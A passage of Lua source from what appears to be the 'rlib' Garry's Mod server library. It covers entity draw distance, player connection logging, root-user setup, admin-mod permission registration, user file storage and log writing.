            ent:SetSaveValue( max, cfg.rdo.drawdist.limits.wls_max )
            continue
        end
    end

    if helper.ok.ent( ent ) and not helper.ok.veh( ent ) then
        ent:SetSaveValue( min, cfg.rdo.drawdist.limits.ent_min )
        ent:SetSaveValue( max, cfg.rdo.drawdist.limits.ent_max )
    elseif helper.ok.npc( ent ) then
        ent:SetSaveValue( min, cfg.rdo.drawdist.limits.npc_min )
        ent:SetSaveValue( max, cfg.rdo.drawdist.limits.npc_max )
    else
        ent:SetSaveValue( min, cfg.rdo.drawdist.limits.oth_min )
        ent:SetSaveValue( max, cfg.rdo.drawdist.limits.oth_max )
    end
end
hook.Add( 'OnEntityCreated', pid( 'ent_drawdistance' ), rdo_ent_drawdistance )

/*
*   pl :: rdo :: draw distance
*
*   utilizes 'fademindist' to apply a fading distance to entities
*   on the map so that they fade away when out of range.
*
*   @param  : ply pl
*/

local function pl_rdo_drawdistance( pl )
    if not cfg.rdo.enabled or not cfg.rdo.drawdist.enabled then return end
    if not helper.ok.ply( pl ) then return end

    pl:SetSaveValue( 'fademindist', cfg.rdo.drawdist.limits.ply_min )
    pl:SetSaveValue( 'fademaxdist', cfg.rdo.drawdist.limits.ply_max )
end
hook.Add( 'PlayerSpawn', pid( 'pl_drawdistance' ), pl_rdo_drawdistance )

/*
*   pl :: authenticate
*
*   @param  : ply pl
*/

local function pl_authenticate( pl )
    timex.simple( 3, function( )
        if not helper.ok.ply( pl ) then return end
        storage:logconn( 1, true, '[ PAuth ] USER:( %s ) STEAM_ID:( %s    %s ) IP:( %s )', pl:Name( ), pl:SteamID( ), pl:SteamID64( ), pl:IPAddress( ) )
    end )
end
hook.Add( 'PlayerAuthed', pid( 'pl_authenticate' ), pl_authenticate )

/*
*   rlib :: setup
*
*   checks to see if root privledges have been assigned to the server owner
*   posts a msg in console and in-game chat informing the server that a root user must be registered
*/

function base:setup( )
    local bHasRoot, rootuser = access:root( )
    if bHasRoot then return end

    con( 'c', 2 )
    con( 'c', 0 )
    con( 'c',       Color( 255, 255, 0 ), lang( 'lib_setup_title', script ) )
    con( 'c', 0 )
    con( 'c', 1 )
    con( 'c',       lang( 'lib_setup_phrase_1' ) )
    con( 'c', 1 )
    con( 'c',       Color( 0, 255, 0 ), lang( 'lib_setup_opt_1' ), Color( 255, 255, 255 ), lang( 'lib_setup_phrase_2' ), Color( 0, 255, 0 ), ' » rlib.setup yourname' )
    con( 'c',       Color( 0, 255, 0 ), lang( 'lib_setup_opt_2' ), Color( 255, 255, 255 ), lang( 'lib_setup_alt_msg_1' ), Color( 0, 255, 0 ), lang( 'lib_setup_alt_cmd' ) )
    con( 'c', 2 )
    con( 'c',       lang( 'lib_setup_phrase_3' ) )
    con( 'c', 1 )
    con( 'c', 0 )
    con( 'c', 2 )

    /*
    *   rlib :: setup :: sends an occasional message in chat that the root user has not been registered yet
    */

    local function noroot_notice( )
        timex.create( 'rlib_noroot_notice', 120, 0, function( )
            direct( nil, script, lang( 'lib_setup_chat_1' ), cfg.cmsg.clrs.target_sec, sf( ' ?%s ', lang( 'perms_flag_setup' ) ), cfg.cmsg.clrs.msg, lang( 'lib_setup_chat_2' ) )
        end )
        rhook.drop.gmod( 'Think', 'rlib_noroot_notice' )
    end
    rhook.new.gmod( 'Think', 'rlib_noroot_notice', noroot_notice )
end

/*
*   rlib :: setup :: kill task
*
*   destroys the timers and hooks associated to the setup notice that displays when a server has not had a root user registered
*
*   @param  : ply pl
*/

function base:setup_killtask( pl )
    timex.expire( 'rlib_noroot_notice' )
    rhook.drop.gmod( 'Think', 'rlib_noroot_notice' )

    base.oort:Authorize( )

    timex.simple( 1, function( )
        pl:ConCommand( pid( 'welcome' ) )
    end )
end

/*
*   rlib :: initialize
*
*   executes numerous processes including the updater, rdo, hooks, and workshop registration
*
*   @parent : hook, Initialize
*/

local function initialize( )
    timex.simple( '__lib_initialize', 0.1, function( )
        base.udm:Run( )

        if cfg.rdo.enabled then
            cvar:Register( 'pdo_set_type', '4', { FCVAR_SERVER_CAN_EXECUTE, FCVAR_REPLICATED }, 'toggle default type\nEnsure that invalid types are not used otherwise rendering issues may occur\nRefer to: http://wiki.garrysmod.com/page/Enums/RENDERMODE' )
            rdo_rendermode( cfg.rdo.enabled )
        end

        if cfg.debug.enabled then
            log( 3, lang( 'debug_start_on' ) )
        end

        -- will start after first player connects
        timex.simple( '__lib_initialize_udm', 3, function( )
            coroutine.resume( run_check_update )
        end )

        -- setup
        timex.simple( '__lib_initialize_setup', 5, function( )
            base:setup( )
        end )

        for k, data in pairs( rlib.w ) do
            local ws_id = ts( k )
            base.get:wsinfo( ws_id )
        end

    end )

    /*
    *   rlib :: hook :: initialize
    */

    timex.simple( 5, function( )
        hook.Run( pid( 'initialize' ) )
    end )
end
hook.Add( 'Initialize', pid( '__lib_initialize' ), initialize )

/*
*   rlib :: bInitialized
*
*   called when the first player connects to the server and 
*   sys.bInitialized = true
*
*   @param  : tbl data
*/

local function bInitialized( data )

        /*
        *   display session id
        *
        *   create a delay so everything can catch up
        */

        timex.simple( '__lib_onready_delay', cfg.hooks.timers[ '__lib_onready_delay' ], function( )
            log( 0 )
            MsgC( Color( 255, 255, 0 ), '[' .. script .. ']', Color( 255, 0, 0 ), ' |  ', Color( 255, 255, 255 ), lang( 'lib_state_initialize' ) )
            timex.create( '__lib_onready_delay', 0.1, 30, function( )
                MsgC( Color( 255, 255, 255 ), '.' )
                if timex.reps( '__lib_onready_delay' ) == 0 then
                    log( 0 )
                    log( 8, lang( 'lib_start_compl', sys.startups ) )
                    log( 0 )

                    rhook.run.rlib( 'rlib_onready_post' )
                end
            end )
        end )

end
hook.Add( 'rlib_bInitialized', pid( '__lib_bInitialized' ), bInitialized )

/*
*   rlib :: initialize :: post
*
*   called within gmod hook InitPostEntity which is after all steps related to rlib and rcore 
*   should be loaded.
*
*   commonly used for actions such as registering permissions, concommands, etc.
*
*   @parent : hook, InitPostEntity
*/

local function __lib_initpostentity( )

    hook.Run( pid( 'cmd.register' ) )
    hook.Run( pid( 'pkg.register' ) )

    /*
    *   register commands
    */

    rcc.prepare( )

    /*
    *   cfgs
    */

    base.cfg            = { }
    base.cfg.steamapi   = storage.get.ext( 'steamapi.cfg' )

    /*
    *   run post initialization hook
    */

    hook.Run( pid( 'initialize.post' ) )

end
hook.Add( 'InitPostEntity', pid( '__lib_initpostentity' ), __lib_initpostentity )

/*
*   initialize :: checksum
*
*   determine if the integrity of the lib files have been tampered
*   with.
*/

local function lib_initialize_checksum( )

    local checksums = base.checksum:verify( )

    local i = 0
    for k, v in pairs( checksums ) do
        if not v.verified or not v.current then continue end
        i = i + 1
    end

    if i > 0 then
        con( nil, 0 )
        con( nil, 1 )
        con( nil, Color( 255, 255, 0 ), lang( 'lib_integrity_title', mf.name:upper( ) ) .. ' \n' )
        con( nil, Color( 255, 255, 255 ), lang( 'lib_integrity_l1' ) )
        con( nil, Color( 255, 255, 255 ), lang( 'lib_integrity_l2' ) )
        con( nil, 1 )
        con( nil, Color( 255, 0, 0 ), lang( 'lib_integrity_cnt', i ) )
        con( nil, 1 )
        con( nil, 0 )
        con( nil, 1 )

        return
    end

    log( RLIB_LOG_SYSTEM, lang( 'lib_integirty_ok', 'OK' ) )

end
hook.Add( pid( 'initialize.post' ), pid( 'initialize_checksum' ), lib_initialize_checksum )

/*
*   database :: check validation
*
*   @param  : tbl source
*   @param  : tbl module
*/

function base:db_pull( source, module )
    if not istable( source ) or not source.m_bConnectedToDB then
        log( 2, lang( 'db_failed', module.id ) )
        return
    end
    return source
end

/*
*   kick players from server using the standard and mod methods
*
*   @ex     : helper.ply:kick( ply, 'kick reason', ply_admin )
*
*   @param  : ply target
*   @param  : str reason
*   @param  : ply admin
*/

function helper.ply:kick( target, reason, admin )
    if ( admin and admin ~= 'sys' and not access:bIsRoot( admin ) ) then
        log( 2, lang( 'kick_invalid_perms' ) )
        return
    end

    if not helper.ok.ply( target ) then
        log( 2, lang( 'kick_invalid_ply' ) )
        return
    end

    reason  = reason or lang( 'action_automatic' )
    admin   = helper.ok.ply( admin ) and admin:Name( ) or lang( 'console' )

    if ulx then
        ULib.kick( target, reason )
    else
        target:Kick( reason )
    end

    log( 4, lang( 'kick_success', admin, target:Name( ), reason ) )
end

/*
*   rlib :: playersay :: setup
*
*   fetches attached pubc params from rlib command calls and assigns them to a playersay.
*
*   this feature is in alpha and not yet fully functional for in-depth commands with argument support.
*   will be added in the future
*
*   @todo   : add arg support
*   @parent : hook, PlayerSay
*
*   @param  : ply pl
*   @param  : str text
*/

local function psay_setup( pl, text )
    if not helper.ok.ply( pl ) then return end
    if text ~= sf( '?%s', lang( 'perms_flag_setup' ) ) then return end

    /*
    *   check :: server initialized
    */

    if not base:bInitialized( ) then
        direct( pl, script, lang( 'lib_initialized' ) )
        return
    end

    /*
    *   check :: already has root usr
    */

    local bHasRoot, rootuser = access:root( )
    if bHasRoot then
        direct( pl, script, lang( 'setup_root_exists' ), Color( 255, 255, 0 ), ( rootuser and rootuser.name ) or 'none' )
        return
    end

    /*
    *   check :: usr must have superadmin group
    */

    if not pl:IsSuperAdmin( ) then
        direct( pl, script, lang( 'setup_root_give_sa' ) )
        return
    end

    /*
    *   check :: see if usr already exists
    */

    local bExists = access:writeuser( pl )
    if bExists then return end

    /*
    *   update admins list for perms
    */

    net.Start       ( 'rlib.user'   )
    net.WriteTable  ( access.admins )
    net.Broadcast   (               )

    /*
    *   send success msg in-game
    */

    direct( pl, script, 'Library Setup » User ', cfg.cmsg.clrs.target_sec, pl:Name( ), cfg.cmsg.clrs.msg, ' has been added with library ', cfg.cmsg.clrs.quad, 'root permissions' )

    /*
    *   report to console for both player and server console
    */

    con( pl, 1 )
    con( pl, Color( 255, 255, 0 ), '» Library Setup\n\n ', cfg.cmsg.clrs.msg, 'User ', cfg.cmsg.clrs.target_sec, pl:Name( ), cfg.cmsg.clrs.msg, ' has been added with ', cfg.cmsg.clrs.quad, 'root permissions', cfg.cmsg.clrs.msg, ' and is protected.' )
    con( pl, 1 )

    con( nil, 1 )
    con( nil, Color( 255, 255, 0 ), '» Library Setup\n\n ', cfg.cmsg.clrs.msg, 'User ', cfg.cmsg.clrs.target_sec, pl:Name( ), cfg.cmsg.clrs.msg, ' has been added with ', cfg.cmsg.clrs.quad, 'root permissions', cfg.cmsg.clrs.msg, ' and is protected.' )
    con( nil, 1 )

    /*
    *   destroy noroot timer / hook
    */

    base:setup_killtask( pl )

end
hook.Add( 'PlayerSay', pid( 'psay.lib.setup' ), psay_setup )

/*
*   rlib :: calls :: public
*
*   fetches attached pubc params from rlib command calls and assigns them to a playersay.
*
*   this feature is in alpha and not yet fully functional for in-depth commands with argument support.
*   will be added in the future
*
*   @todo   : add arg support
*   @parent : hook, PlayerSay
*
*   @param  : ply pl
*   @param  : str text
*/

local function calls_commands_pub( pl, text )
    if not helper.ok.ply( pl ) then return end
    if not _G.rcalls.pubc then return end

    if _G.rcalls.pubc[ text ] then
        local func = isfunction( _G.rcalls.pubc[ text ].func ) and _G.rcalls.pubc[ text ].func
        if not func then return end
        func( pl )
        return ''
    end
end
hook.Add( 'PlayerSay', pid( 'calls.commands.pub' ), calls_commands_pub )

/*
*   shutdown
*
*   called when the server is shutting down or changing levels.
*
*   @parent : hook, ShutDown
*/

local function shutdown( )
    log( 6, lang( 'server_shutdown' ) )
    konsole:log( 'debug', 'System', 'SERVER SHUTDOWN\n\n' )
end
hook.Add( 'ShutDown', pid( '__lib_server_shutdown' ), shutdown )

/*
*   base :: onPlayerSpawn
*
*   player has spawned for the first time
*/

local function onPlayerSpawn( pl )
    timex.simple( 'rlib_pl_spawn', 3, function( )
        if not helper.ok.ply( pl ) then return end

        if cvar:GetBool( 'rlib_pco_autogive' ) then
            tools.pco:Run( pl, true )
        end

        net.Start       ( 'rlib.user.update'    )
        net.Send        ( pl                    )

        if not access.admins or not access.admins[ pl:SteamID( ) ] then return end

        access:writeuser( pl, true )

        net.Start       ( 'rlib.user'           )
        net.WriteTable  ( access.admins         )
        net.Send        ( pl                    )
    end )
end
hook.Add( 'PlayerInitialSpawn', pid( 'pl.spawn' ), onPlayerSpawn )

/*
*   access :: initialize
*
*   on server start, load all permissions provided through a table.
*
*   if no table specified; will load base script permissions which are in rlib.permissions table
*
*   function is called both server and clientside due to different admin mods registering permissions
*   differently; as well as other functionality.
*
*   @call   : access:initialize( base.modules.permissions )
*   @param  : tbl perms
*/

function access:initialize( perms )

    access.admins = { }

    if not perms then perms = base.permissions end

    local cat   = perms[ 'index' ] and perms[ 'index' ].category or script
    local sw    = lang( 'perms_type_base' )

    for k, v in pairs( perms ) do
        if ( k == lang( 'perms_flag_index' ) or k == lang( 'perms_flag_setup' ) ) then continue end
        if not serverguard and ( v.is_ext or v.is_interactive or v.bInteractive ) then
            if ulx then
                sw = lang( 'perms_type_ulx_int' )
            end
            log( RLIB_LOG_PERM, lang( 'perms_add', sw, perms[ k ].id ) )
            continue
        end
        if perms[ k ].category then
            cat = perms[ k ].category
        end

        if ulx then

            /*
            *   permissions :: ulx
            */

            local ulx_usrgroup = access:ulx_getgroup( perms[ k ].access or perms[ k ].usrlvl ) or access:ulx_getgroup( 'superadmin' )
            ULib.ucl.registerAccess( k, ulx_usrgroup, perms[ k ].desc, cat )
            sw = lang( 'perms_type_ulx' )

        elseif serverguard then

            /*
            *   permissions :: serverguard
            */

            local id = isstring( v.name ) and v.name or k
            serverguard.permission:Add( id )
            sw = lang( 'perms_type_sg' )

        end

        log( RLIB_LOG_PERM, lang( 'perms_add', sw, perms[ k ].id ) )
    end

    local path_data = storage.mft:getpath( 'data_users' )
    if file.Exists( path_data, 'DATA' ) then
        local mdata     = storage.exists( path_data ) and file.Read( path_data, 'DATA' ) or [[ ]]
        local struct    = util.JSONToTable( mdata ) or { }
        access.admins   = struct
    end

end
hook.Add( pid( 'initialize.post' ), pid( 'initialize_perms' ), access.initialize )

/*
*   access :: get users
*
*   fetches all stored users from the user file
*
*   @call   : local struct = access:getusers( )
*
*   @return : tbl
*/

function access:getusers( )
    local path_data     = storage.mft:getpath( 'data_users' )
    local mdata         = storage.exists( path_data ) and file.Read( path_data, 'DATA' ) or [[ ]]

    return util.JSONToTable( mdata ) or { }
end

/*
*   access :: hasuser
*
*   checks if a user exists
*
*   @call   : local bExists = access:hasuser( pl )
*
*   @param  : ply pl
*   @return : bool
*/

function access:hasuser( pl )
    if not helper.ok.ply( pl ) then return end

    local struct    = self:getusers( )
    local sid       = pl:SteamID( )

    if struct[ sid ] then return true end
    return false
end

/*
*   access :: root
*
*   returns the root user registered with rlib
*
*   @call   : local bHasRoot, rootuser = access:root( )
*
*   @return : tbl, bool
*/

function access:root( )
    local struct    = self:getusers( )
    local bHasRoot  = false
    local rootuser  = nil

    for v in helper.get.data( struct ) do
        if not v.is_root then continue end
        bHasRoot = true
        rootuser = v
    end

    return bHasRoot, rootuser
end

/*
*   access :: writeuser
*
*   writes a player to the user file
*
*   @param  : ply ply
*   @param  : bool bIncreaseConn
*   @param  : bool bProtected
*   @return : bool
*           : true    : user existed
*           : false   : user created
*/

function access:writeuser( pl, bIncreaseConn, bProtected )
    if not helper.ok.ply( pl ) then return end

    local struct        = self:getusers( )
    local bIsRoot       = table.Count( struct ) == 0 and true or ( bProtected and true ) or false

    /*
    *   pl info
    */

    local pl_name, pl_sid, pl_sid64 = pl:Name( ), pl:SteamID( ), pl:SteamID64( )

    /*
    *   user already exists
    */

    if struct[ pl_sid ] then
        local userdata      = struct[ pl_sid ]
        userdata.name       = pl_name
        userdata.date_seen  = os.time( )
        userdata.is_root    = ( userdata.is_root and true ) or bIsRoot or false
        userdata.conn       = ( bIncreaseConn and ( userdata.conn or 0 ) + 1 ) or ( userdata.conn or 0 )

        file.Write( storage.mft:getpath( 'data_users' ), util.TableToJSON( struct, true ) )
        access.admins = struct

        log( 6, lang( 'user_updated', pl_name ) )

        return true
    end

    /*
    *   new user
    */

    struct[ pl_sid ] =
    {
        name            = pl_name,
        steam64         = pl_sid64,
        date_added      = os.time( ),
        date_seen       = 0,
        conn            = 0,
        is_root         = bIsRoot,
    }

    file.Write( storage.mft:getpath( 'data_users' ), util.TableToJSON( struct, true ) )
    access.admins = struct

    log( 6, lang( 'user_add', pl_name ) )
    if bIsRoot then
        log( 4, lang( 'user_add_root', pl_name ) )
    end

    return false
end

/*
*   access :: deluser
*
*   removes a user from the library user file
*
*   @param  : ply pl
*   @return : bool
*           : true      : user removed
*           : false     : user didnt exist
*/

function access:deluser( pl )
    if not isstring( pl ) and not helper.ok.ply( pl ) then return end

    local struct = self:getusers( )

    /*
    *   allows for pl to also be a string, helps with special circumstances or steaing with bots.
    *   the string pl should be their steam32 id
    */

    if isstring( pl ) and helper.ok.sid32( pl ) then
        if not struct[ pl ] then return false end

        local name = struct[ pl ] and struct[ pl ].name or isstring( pl ) and pl or 'unknown'

        struct[ pl ] = nil

        file.Write( storage.mft:getpath( 'data_users' ), util.TableToJSON( struct, true ) )
        access.admins = struct

        log( 6, lang( 'user_remove', name ) )
        return true
    end

    local pl_name  = pl:Name( )
    local pl_sid   = pl:SteamID( )

    /*
    *   user exists
    */

    if struct[ pl_sid ] then
        if struct[ pl_sid ].is_root then
            log( 2, lang( 'user_noremove_root', pl_name ) )
            return false
        end

        struct[ pl_sid ] = nil

        file.Write( storage.mft:getpath( 'data_users' ), util.TableToJSON( struct, true ) )
        access.admins = struct

        log( 6, lang( 'user_remove', pl_name ) )

        return true
    end

    return false
end

/*
*   storage :: users
*
*   user management system
*/

local function storage_users_initialize( )
    if file.Exists( storage.mft:getpath( 'data_users' ), 'DATA' ) then return end

    local data = { }
    file.Write( storage.mft:getpath( 'data_users' ), glon.encode( data ) )
end
hook.Add( 'InitPostEntity', pid( '__lib_ums' ), storage_users_initialize )

/*
*   storage :: logging :: server
*
*   log action information to the data folder
*       /rlib/server/
*
*   to write a log to another directory not associated to /rlib/logs => use 
*       rlib :: konsole:log( path, mtype, data )
*
*   files in the directory are created based on the current date. a new file will be made if a log is 
*   submitted on a day where no file with that date exists.
*
*   @call   : storage:log( 1, false, 'information to log' )
*
*   @param  : int cat
*   @param  : bool bKonsole
*   @param  : str msg
*   @param  : varg { ... }
*/

function storage:log( cat, bKonsole, msg, ... )
    if not cat then cat = 1 end
    if bKonsole and ( not isbool( bKonsole ) and bKonsole ~= nil ) then return end
    if not msg and not isstring( msg ) then return end

    local args          = { ... }

    local result, msg   = pcall( sf, msg, unpack( args ) )

    local c_type        = isnumber( cat ) and '[' .. helper.str:ucfirst( base._def.debug_titles[ cat ] ) .. ']' or isstring( cat ) and '[' .. cat .. ']' or lang( 'logs_cat_general' )
    local m_pf          = os.date( '%m%d%Y' )
    local m_id          = sf( 'RL_%s.txt', m_pf )

    local when          = '[' .. os.date( '%I:%M:%S' ) .. ']'
    local resp          = sf( '%s %s %s', when, c_type, msg )
    local i_boot        = sys.startups or 0

                        if i_boot == 0 or i_boot == '0' then
                            i_boot = '#boot'
                        end

    local path          = sf( '%s/%s', path_server, i_boot )

    storage.dir.create  ( path )
    storage.file.append ( path, m_id, resp )

    if bKonsole then
        konsole:add_simple( cat, msg )
    end
end

/*
*   storage :: logging :: user connections
*
*   log action information to the data folder
*       /rlib/uconn/
*
*   to write a log to another directory not associated to /rlib/logs => use 
*       rlib :: konsole:log( path, cat, data )
*
*   files in the directory are created based on the current date. a new file will be made if a log is 
*   submitted on a day where no file with that date exists.
*
*   @call   : storage:logconn( 1, false, 'information to log' )
*
*   @param  : int cat
*   @param  : bool bKonsole
*   @param  : str msg
*   @param  : varg { ... }
*/

function storage:logconn( cat, bKonsole, msg, ... )
    if not cat then cat = 1 end
    if bKonsole and ( not isbool( bKonsole ) and bKonsole ~= nil ) then return end
    if not msg and not isstring( msg ) then return end

    local args          = { ... }

    local result, msg   = pcall( sf, msg, unpack( args ) )

    local c_type        = isnumber( cat ) and '[' .. helper.str:ucfirst( base._def.debug_titles_uconn[ cat ] ) .. ']' or isstring( cat ) and '[' .. cat .. ']' or lang( 'logs_cat_uconn' )
    local m_pf          = os.date( '%m%d%Y' )
    local m_id          = sf( 'RL_%s.txt', m_pf )

    local when          = '[' .. os.date( '%I:%M:%S' ) .. ']'
    local resp          = sf( '%s %s %s', when, c_type:upper( ), msg )
    local i_boot        = sys.startups or 0

                        if i_boot == 0 or i_boot == '0' then
                            i_boot = '#boot'
                        end

    local path          = sf( '%s/%s', path_uconn, i_boot )

    storage.dir.create  ( path )
    storage.file.append ( path, m_id, resp )

    if bKonsole then
        konsole:add_simple( cat, msg )
    end
end

/*
*   storage :: get :: db
*
*   should be used specifically for fetching a module
*   database storage file
*
*   returns the specified cfg values
*
*   @call   : storage.get.db( mod )
*             storage.get.db( 'module_str_name' )
*
*   @since  : v3.0.0
*   @param  : tbl, str mod
*   @return : tbl
*/

function storage.get.db( mod )
    if not mod then
        log( 2, 'mod not specified\n%s', debug.traceback( ) )
        return false
    end

    if not istable( rcore ) then
        log( 2, 'rcore missing\n%s', debug.traceback( ) )
        return false
    end

    local db_file = nil
    if istable( rcore ) and ( isstring( mod ) and rcore.modules[ mod ] and rcore.modules[ mod ].enabled ) then
        db_file = rcore.modules[ mod ].dbconn or nil
    elseif istable( mod ) then
        db_file = mod.dbconn or nil
    end

    if not db_file then
        if istable( rcore ) and ( isstring( mod ) and rcore.modules[ mod ] and rcore.modules[ mod ].enabled ) then
            db_file = rcore.modules[ mod ].ext[ 'database' ] or nil
        elseif istable( mod ) then
            db_file = mod.ext and mod.ext[ 'database' ] or nil
        end
    end

    if not db_file then
        log( 2, 'specified module missing db assignment in manifest\n%s', debug.traceback( ) )
        return false
    end

    local r_files, r_dirs = file.Find( 'addons/*', 'MOD' )
    for fol in rlib.h.get.data( r_dirs, true ) do
        local lib_sub = sf( '%s/%s/%s', 'addons', fol, db_file )
        if ( file.Exists( lib_sub, 'MOD' ) ) then
            local values = util.KeyValuesToTable(
                file.Read( lib_sub, 'MOD' )
            )
            return values
        end
    end
end

/*
*   storage :: get :: external
*
*   used for the libs new config method which stores the cfg in the root
*   directory of the lib folder.
*
*   supports lib and lib modules
*
*   returns the specified cfg values
*
*   @call   : storage.get.ext( 'steamapi.cfg' )
*           : storage.get.ext( 'database.cfg', 'identix' )
*           : storage.get.ext( 'database.cfg', mod_table )
*           : storage.get.ext( 'modulename.rlib', mod_table )
*
*   @since  : v1.1.4
*   @param  : str cfg
*   @return : tbl
*/

function storage.get.ext( txt )
    if not isstring( txt ) then
        log( 2, lang( 'lib_cfg_invalid' ) )
        return
    end

    local r_files, r_dirs = file.Find( 'addons/*', 'MOD' )
    for fol in rlib.h.get.data( r_dirs, true ) do
        local lib_sub = sf( '%s/%s/%s', 'addons', fol, txt )
        if ( file.Exists( lib_sub, 'MOD' ) ) then
            local values = util.KeyValuesToTable(
                file.Read( lib_sub, 'MOD' )
            )
            return values
        end
    end
end

/*
*   storage :: get :: env
*
*   gets the official module env data file
*
*   proper env files must be [ module_name.env ] and stored
*   in the root module folder ( same as addons/module_name/ )
*
*   @call   : storage.get.env( mod )
*           : storage.get.env( 'identix' )
*
*   @ref    : addons/module_name/module_name.env
*
*   @since  : v3.0.0
*   @param  : tbl, str mod
*   @return : tbl
*/

function storage.get.env( mod )
    if not mod then
        log( 2, 'mod not specified\n%s', debug.traceback( ) )
        return false
    end

    if not istable( rcore ) then
        log( 2, 'rcore missing\n%s', debug.traceback( ) )
        return false
    end

    local env_id = nil
    if istable( rcore ) and ( isstring( mod ) and rcore.modules[ mod ] and rcore.modules[ mod ].enabled ) then
        env_id = rcore.modules[ mod ].environment or mod.id or nil
    elseif istable( mod ) then
        env_id = mod.environment or mod.id or nil
    end

    if not env_id then
        log( 2, 'specified module missing env', debug.traceback( ) )
        return false
    end

    local r_files, r_dirs = file.Find( 'addons/*', 'MOD' )
    for fol in rlib.h.get.data( r_dirs, true ) do
        local lib_sub = sf( '%s/%s/%s.%s', 'addons', fol, env_id, 'env' )
        if ( file.Exists( lib_sub, 'MOD' ) ) then
            local values = util.KeyValuesToTable(
                file.Read( lib_sub, 'MOD' )
            )
            return values
        end
    end
end

/*
*   storage :: json :: cfg
*
*   returns json data stored within the root directory of a registered
*   module ( addons/module_name/file.json )
*
*   converts json to lua table
*
*   @call   : storage.get.json( 'checksum.json' )
*           : storage.get.json( 'file.json' )
*
*   @since  : v3.0.0
*   @param  : str txt
*   @return : tbl
*/

function storage.get.json( txt )
    if not isstring( txt ) then
        log( 2, lang( 'lib_cfg_invalid' ) )
        return
    end

    local r_files, r_dirs = file.Find( 'addons/*', 'MOD' )
    for fol in rlib.h.get.data( r_dirs, true ) do
        local lib_sub = sf( '%s/%s/%s', 'addons', fol, txt )
        if ( file.Exists( lib_sub, 'MOD' ) ) then
            local values = util.JSONToTable(
                file.Read( lib_sub, 'MOD' )
            )
            return values
        end
    end
end

/*
*   activates in-game debugging
*   uses a similar format to string.format
*
*   @call   : konsole:send( pl, int, 'message str %s', arg, arg )
*
*   @param  : ply pl
*   @param  : int cat
*   @param  : str msg
*   @param  : varg { ... }
*/

function konsole:send( pl, cat, msg, ... )
    if not helper.ok.ply( pl ) then return end
    if not msg or not isstring( msg ) then return end

    local args = { ... }

    local resp, msg = pcall( sf, msg, unpack( args ) )
    if resp then
        net.Start       ( 'rlib.debug.ui'   )
        net.WriteInt    ( cat, 4            )
        net.WriteString ( msg               )
        net.Send        ( pl                )
    end
end

/*
*   debug :: initialize
*
*   create paths for debugging / logs
*   determines size of debug storage directory in data folder and posts information to console.
*
*   @parent : hook, InitPostEntity
*/

local function logs_initialize( )
    storage.dir.create( path_alogs  )
    storage.dir.create( path_logs   )
    storage.dir.create( path_uconn  )

    /*
    *   logs dir diskspace and file count
    */

    sys.log_sz, sys.log_ct, sys.log_fol_ct = calc.fs.diskTotal( path_logs )

    /*
    *   uconn dir diskspace and file count
    */

    sys.uconn_sz, sys.uconn_ct, sys.uconn_fol_ct = calc.fs.diskTotal( path_uconn )

    /*
    *   diskspace usage msg
    */

    if sys.log_fol_ct > cfg.debug.clean_threshold then
        log( 3, lang( 'logs_clean_threshold', sys.log_ct, sys.log_fol_ct, path_logs, sys.log_sz, 'rlib.debug.cleanlogs' ) )
    else
        log( RLIB_LOG_SYSTEM, lang( 'logs_dir_size', sys.log_ct, sys.log_fol_ct, path_logs, sys.log_sz ) )
    end

end
hook.Add( 'InitPostEntity', pid( '__lib_debug_logging' ), logs_initialize )

/*
*   debug :: log
*
*   logs information to the rlib directory.
*   path will match to manifest.paths first before doing a custom directory.
* 
*   @call   : konsole:log( 'test', 1, 'hi' )
*             will create a new directory called rlib/test
*
*           : konsole:log( 'debug', 1, 'hi' )
*             will append to an existing dated file in rlib/debug
*
*   @param  : str path
*   @param  : int cat
*   @param  : str data
*/

function konsole:log( path, cat, data )
    if not isstring( path ) then
        log( 2, lang( 'logs_nopath' )  )
        return
    end

    path            = mf.paths[ path ] or sf( '%s/%s', mf.name, path )
    cat             = isnumber( cat ) and cat or 1

    local c_type    = isnumber( cat ) and '[' .. helper.str:ucfirst( base._def.debug_titles[ cat ] ) .. ']' or isstring( cat ) and '[' .. cat .. ']' or ''

    /*
    *   determines if data is string or table
    *   if table, loop through to pick up strings from colors
    *   found in vararg and then concat table to string
    */

    local args = { }
    if istable( data ) then
        for k, v in pairs( data ) do
            if not v then continue end
            if istable( v ) then continue end
            table.insert( args, v )
        end
    end

    if istable( args ) and #args > 0 then
        data = table.concat( args, '' )
    end

    local m_pf          = os.date( '%m%d%Y' )
    local m_id          = sf( 'RL_%s.txt', m_pf )

    local when          = '[' .. os.date( '%I:%M:%S' ) .. ']'
    local resp          = sf( '%s %s %s', when, c_type, data )

    local i_boot        = sys.startups or 0

                        if i_boot == 0 or i_boot == '0' then
                            i_boot = '#boot'
                        end

    local lpath         = sf( '%s/%s', path, i_boot )

    storage.file.append( lpath, m_id, resp )
end

/*
*   tools :: rdo :: run
*
*   called within gmod hook InitPostEntity which is after all steps related to rlib and rcore should 
*   be loaded.
*
*   commonly used for actions such as registering permissions, concommands, etc.
*
*   @todo   : add playersay abilities
*/

function tools.rdo:Run( )
    timex.simple( 'rlib_rdo_initialize', 5, function( )
        if not cfg.rdo.enabled then return end
        rdo_rendermode( cfg.rdo.enabled )
    end )
end
hook.Add( pid( 'initialize.post' ), pid( 'initialize_tools_rdo' ), tools.rdo.Run )

/*
*   rlib :: pco
*
*   initializes pco on target pl
*
*   @param  : ply pl
*   @param  : bool b
*   @param  : ply admin
*/

function tools.pco:Run( pl, b, admin )
    if not helper.ok.ply( pl ) then return end

    local pl_nw     = pl:GetNWBool( pid( 'tools.pco' ) )
    local set       = ( b ) or ( pl_nw and false ) or ( not pl_nw and true ) or false
    local toggle    = helper.util:toggle( set )

    pl:SetNWBool( pid( 'tools.pco' ), toggle )

    net.Start       ( 'rlib.tools.pco'  )
    net.WriteBool   ( toggle            )
    net.Send        ( pl                )

    toggle = toggle and lang( 'opt_enabled' ) or lang( 'opt_disabled' )

    local clr_status = set and cfg.cmsg.clrs.target or cfg.cmsg.clrs.target_sec

    if helper.ok.ply( admin ) then
        direct( pl, lang( 'services_id_pco' ):upper( ), '» ', clr_status, toggle, cfg.cmsg.clrs.msg, ' on you by admin ', cfg.cmsg.clrs.target_tri, admin:Name( ) )
        direct( admin, lang( 'services_id_pco' ):upper( ), '» ', clr_status, toggle, cfg.cmsg.clrs.msg, ' for user ', cfg.cmsg.clrs.target_tri, pl:Name( ) )
        log( 1, lang( 'pco_set_debug_usr_admin', admin:Name( ), toggle, pl:Name( ) ) )
        return
    end

    if cfg.pco.broadcast.onjoin then
        direct( pl, lang( 'services_id_pco' ):upper( ), '» ', clr_status, toggle )
